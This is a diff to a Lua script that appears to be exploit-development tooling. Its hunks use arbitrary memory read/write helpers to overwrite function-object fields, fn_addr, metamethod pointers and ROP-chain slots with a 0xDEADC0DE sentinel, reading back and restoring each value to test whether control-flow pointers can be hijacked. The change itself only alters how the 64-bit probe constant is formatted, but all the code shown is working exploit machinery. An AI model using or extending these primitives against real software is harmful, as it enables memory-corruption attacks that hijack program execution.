@@ -211,7 +211,7 @@ local write_results = {}
 for _, off in ipairs({24, 32, 40, 48, 16}) do
     local saved = safe_rq(fn_obj + off)
     if saved then
-        local probe_val = uint64("0xDEADC0DE_DEADC0DE")
+        local probe_val = uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE))
         local wrote = safe_wq(fn_obj + off, probe_val)
         local readback = safe_rq(fn_obj + off)
         safe_wq(fn_obj + off, saved)  -- RESTORE immediately
@@ -379,7 +379,7 @@ if rop_str then
             local mod, sect, moff = find_module(h, l)
             if mod and sect == "text" then
                 local saved = val
-                local wrote = safe_wq(rop_addr + off, uint64("0xDEADC0DE_DEADC0DE"))
+                local wrote = safe_wq(rop_addr + off, uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE)))
                 local rb = safe_rq(rop_addr + off)
                 safe_wq(rop_addr + off, saved)
                 local rb_h, rb_l = get_hi_lo(rb)
@@ -414,7 +414,7 @@ if fn_str then
     local fn_val = safe_rq(fn_addr)
     if fn_val then
         local saved = fn_val
-        local wrote = safe_wq(fn_addr, uint64("0xDEADC0DE_DEADC0DE"))
+        local wrote = safe_wq(fn_addr, uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE)))
         local rb = safe_rq(fn_addr)
         safe_wq(fn_addr, saved)
         local rb_h, rb_l = get_hi_lo(rb)
@@ -442,7 +442,7 @@ for _, key in ipairs({"__call", "__tostring", "__index", "arg_addr", "chain",
             local cfp = safe_rq(fobj + 32)
             if cfp then
                 local saved = cfp
-                local wrote = safe_wq(fobj + 32, uint64("0xDEADC0DE_DEADC0DE"))
+                local wrote = safe_wq(fobj + 32, uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE)))
                 local rb = safe_rq(fobj + 32)
                 safe_wq(fobj + 32, saved)
                 local rb_h, rb_l = get_hi_lo(rb)
@@ -500,7 +500,7 @@ if ok_aa and arg_addr_fn then
                         local mod, sect, moff = find_module(h, l)
                         if mod and sect == "text" then
                             local saved = v
-                            safe_wq(base + off, uint64("0xDEADC0DE_DEADC0DE"))
+                            safe_wq(base + off, uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE)))
                             local rb = safe_rq(base + off)
                             safe_wq(base + off, saved)
                             local rb_h = get_hi_lo(rb)
@@ -613,7 +613,7 @@ else
             print("fn_addr current value: " .. fmt_addr(fn_val))
             print("Testing fn_addr writability...")
             local saved = fn_val
-            safe_wq(fn_addr, uint64("0xDEADC0DE_DEADC0DE"))
+            safe_wq(fn_addr, uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE)))
             local rb = safe_rq(fn_addr)
             safe_wq(fn_addr, saved)
             local rb_h = get_hi_lo(rb)
